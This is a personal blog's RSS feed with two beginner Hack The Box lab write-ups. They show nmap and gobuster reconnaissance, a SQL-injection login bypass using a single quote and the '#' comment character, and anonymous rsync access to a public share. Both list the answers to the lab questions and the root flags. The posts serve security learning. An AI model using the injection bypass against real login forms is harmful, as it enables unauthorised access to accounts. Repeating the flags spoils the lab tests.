<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Wook&#39;s blog</title>
    <link>http://localhost:1313/</link>
    <description>Recent content on Wook&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <managingEditor>leewookb@gmail.com (Wook Lee)</managingEditor>
    <webMaster>leewookb@gmail.com (Wook Lee)</webMaster>
    <lastBuildDate>Thu, 11 Jul 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>[HTB] Appointment</title>
      <link>http://localhost:1313/htb-appointment/</link>
      <pubDate>Thu, 11 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-appointment/</guid>
      <description>I just finished Tier 0 of the Starting Point and now I&amp;rsquo;m moving on to Tier 1 boxes. These are still very easy level boxes, but we all start somewhere, and I&amp;rsquo;m enjoying every step of this process. That&amp;rsquo;s what matters hehe.
What does the acronym SQL stand for? Structured Query Language What is one of the most common type of SQL vulnerabilities? SQL Injection What is the 2021 OWASP Top 10 classification for this vulnerability?</description>
      <content:encoded><![CDATA[<p>I just finished Tier 0 of the Starting Point and now I&rsquo;m moving on to Tier 1 boxes. These are still <code>very easy</code> level boxes, but we all start somewhere, and I&rsquo;m enjoying every step of this process. That&rsquo;s what matters hehe.</p>
<p><img src="image.png#center" alt="alt text"></p>
<hr>
<h4 id="what-does-the-acronym-sql-stand-for">What does the acronym SQL stand for?</h4>






<pre tabindex="0"><code>Structured Query Language</code></pre>
<br>
<h4 id="what-is-one-of-the-most-common-type-of-sql-vulnerabilities">What is one of the most common type of SQL vulnerabilities?</h4>






<pre tabindex="0"><code>SQL Injection</code></pre>
<br>
<h4 id="what-is-the-2021-owasp-top-10-classification-for-this-vulnerability">What is the 2021 OWASP Top 10 classification for this vulnerability?</h4>






<pre tabindex="0"><code>A03:2021-Injection</code></pre>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="what-does-nmap-report-as-the-service-and-version-that-are-running-on-port-80-of-the-target">What does Nmap report as the service and version that are running on port 80 of the target?</h4>






<pre tabindex="0"><code>Apache httpd 2.4.38 ((Debian))</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sC -sV 10.129.50.1 -p <span style="color:#fab387">80</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-11 13:16 CDT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.50.1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.0085s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>80/tcp open  http    Apache httpd 2.4.38 <span style="color:#89dceb;font-weight:bold">((</span>Debian<span style="color:#89dceb;font-weight:bold">))</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>|_http-server-header: Apache/2.4.38 <span style="color:#89dceb;font-weight:bold">(</span>Debian<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>|_http-title: Login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 6.76 seconds</span></span></code></pre></div>
<br>
<h4 id="what-is-the-standard-port-used-for-the-https-protocol">What is the standard port used for the HTTPS protocol?</h4>






<pre tabindex="0"><code>443</code></pre>
<br>
<h4 id="what-is-a-folder-called-in-web-application-terminology">What is a folder called in web-application terminology?</h4>






<pre tabindex="0"><code>directory</code></pre>
<br>
<h4 id="what-is-the-http-response-code-is-given-for-not-found-errors">What is the HTTP response code is given for &lsquo;Not Found&rsquo; errors?</h4>






<pre tabindex="0"><code>404</code></pre>
<br>
<h4 id="gobuster-is-one-tool-used-to-brute-force-directories-on-a-webserver-what-switch-do-we-use-with-gobuster-to-specify-were-looking-to-discover-directories-and-not-subdomains">Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we&rsquo;re looking to discover directories, and not subdomains?</h4>






<pre tabindex="0"><code>dir</code></pre>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<h4 id="what-singlce-character-can-be-used-to-comment-out-the-rest-of-a-line-in-mysql">What singlce character can be used to comment out the rest of a line in MySQL?</h4>






<pre tabindex="0"><code>#</code></pre>
<p>We can also use <code>--</code> for commenting, but that&rsquo;s two characters.</p>
<br>
<h4 id="if-user-input-is-not-handled-carefully-it-could-be-interpreted-as-a-comment-use-a-comment-to-login-as-admin-without-knowing-the-password-what-is-the-first-word-on-the-webpage-returned">If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?</h4>






<pre tabindex="0"><code>Congratulations</code></pre>
<p>I first tried <code>admin#</code> but kept failing to log in, so since the <code>gobuster</code> was mentioned earlier, I tried dirbuster to see if there were any helpful folders open but couldn&rsquo;t find any.</p>
<p>After peeping the provided walkthrough, I learned that I had to include <code>'</code> the single quote to close the query, allowing the script to search for the <code>admin</code> username and then add the hashtag symbol to comment out the rest of the query.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ gobuster dir -u http://10.129.50.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Gobuster v3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>by OJ Reeves <span style="color:#89dceb;font-weight:bold">(</span>@TheColonial<span style="color:#89dceb;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#89dceb;font-weight:bold">(</span>@firefart<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Url:                     http://10.129.50.1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Method:                  GET
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Threads:                 <span style="color:#fab387">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Negative Status codes:   <span style="color:#fab387">404</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Timeout:                 <span style="color:#f5e0dc">10s</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Starting gobuster in directory enumeration <span style="color:#f5e0dc">mode</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>/images               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 311<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.50.1/images/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>/css                  <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 308<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.50.1/css/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>/js                   <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 307<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.50.1/js/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>/vendor               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 311<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.50.1/vendor/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>/fonts                <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 310<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.50.1/fonts/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>/server-status        <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 276<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>Progress: <span style="color:#fab387">220560</span> / <span style="color:#fab387">220561</span> <span style="color:#89dceb;font-weight:bold">(</span>100.00%<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span><span style="color:#f5e0dc">Finished</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span></span></span></code></pre></div>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>e3d0796d002a446c0e622226f42e9672</code></pre>
<br>
<p><img src="image-5.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Synced</title>
      <link>http://localhost:1313/htb-synced/</link>
      <pubDate>Thu, 11 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-synced/</guid>
      <description>What is the default port for rsync? 873 How many TCP ports are open on the remote host? 1 As always, started off by running the nmap scan on all ports and turned out there is only 1 open port on 873 and it&amp;rsquo;s rsync.
1┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-wv2b0ymwtt]─[~] 2└──╼ [★]$ nmap -sC -sV 10.129.49.240 -p- 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 12:14 CDT 4Nmap scan report for 10.129.49.240 5Host is up (0.</description>
      <content:encoded><![CDATA[<h4 id="what-is-the-default-port-for-rsync">What is the default port for rsync?</h4>






<pre tabindex="0"><code>873</code></pre>
<br>
<h4 id="how-many-tcp-ports-are-open-on-the-remote-host">How many TCP ports are open on the remote host?</h4>






<pre tabindex="0"><code>1</code></pre>
<p>As always, started off by running the nmap scan on all ports and turned out there is only 1 open port on 873 and it&rsquo;s <code>rsync</code>.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sC -sV 10.129.49.240 -p-
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-11 12:14 CDT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.49.240
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.0092s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">65534</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>reset<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>873/tcp open rsync <span style="color:#89dceb;font-weight:bold">(</span>protocol version 31<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 16.33 seconds</span></span></code></pre></div>
<br>
<h4 id="what-is-the-protocol-version-used-by-rsync-on-the-remote-machine">What is the protocol version used by rsync on the remote machine?</h4>






<pre tabindex="0"><code>31</code></pre>
<br>
<h4 id="what-is-the-most-common-command-name-on-linux-to-interact-with-rsync">What is the most common command name on Linux to interact with rsync?</h4>






<pre tabindex="0"><code>rsync</code></pre>
<p><strong>rsync</strong> is an open source utility that provides fast incremental file transfer. The way rsync works makes it an excellent choice when there is a need to synchronize files between a computer and a storage drive and across networked computers.</p>
<br>
<h4 id="what-credentials-do-you-have-to-pass-to-rsync-in-order-to-use-anonymous-authentication-anonymousanonymous-anonymous-none-rsyncrsync">What credentials do you have to pass to rsync in order to use anonymous authentication? anonymous:anonymous, anonymous, None, rsync:rsync</h4>






<pre tabindex="0"><code>None</code></pre>
<br>
<h4 id="what-is-the-option-to-only-list-shares-and-files-on-rsync-no-need-to-include-the-leading---characters">What is the option to only list shares and files on rsync? (No need to include the leading &ndash;characters)</h4>






<pre tabindex="0"><code>list-only</code></pre>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>72eaf5344ebb84908ae543a719830519</code></pre>
<p>The generic syntax used by <code>rsync</code> is the following:</p>






<pre tabindex="0"><code>rsync [OPTION] ... [USER@]HOST::SRC [DEST]</code></pre>
<p>where SRC is the file or directory to copy from, DEST is the file or directory to copy to, and square brackets indicate optional parameters.</p>
<p>The <code>[USER@]</code> optional parameter is used when we want to access the remote machine in an authetnicated way. In this case, we don&rsquo;t have any valid credentials so we will omit this portion and try an anonymous authentication.</p>
<p><code>rsync --list-only 10.129.49.240::</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ rsync --list-only 10.129.49.240::
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>public         	Anonymous Share</span></span></code></pre></div>
<br>
<p>Notice there is a public directory with the description, Anonymous Share.
Let&rsquo;s navigate to public directory</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ rsync --list-only 10.129.49.240::public
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>drwxr-xr-x          4,096 2022/10/24 17:02:23 .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>-rw-r--r--             <span style="color:#fab387">33</span> 2022/10/24 16:32:03 flag.txt</span></span></code></pre></div>
<br>
<p>okay we see there&rsquo;s the <code>flag.txt</code> file. Now let&rsquo;s copy this file to our local machine.
When downloading the file to our local machine, make sure to remove the <strong><em>&ndash;list-only</em></strong> option and specify the destination.</p>
<p><code>rsync [OPTION] ... [USER@]HOST::SRC [DEST]</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ rsync 10.129.49.240::public/flag.txt flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>flag.txt  htb_vpn_logs.log  my_credentials.txt  my_data  README.license
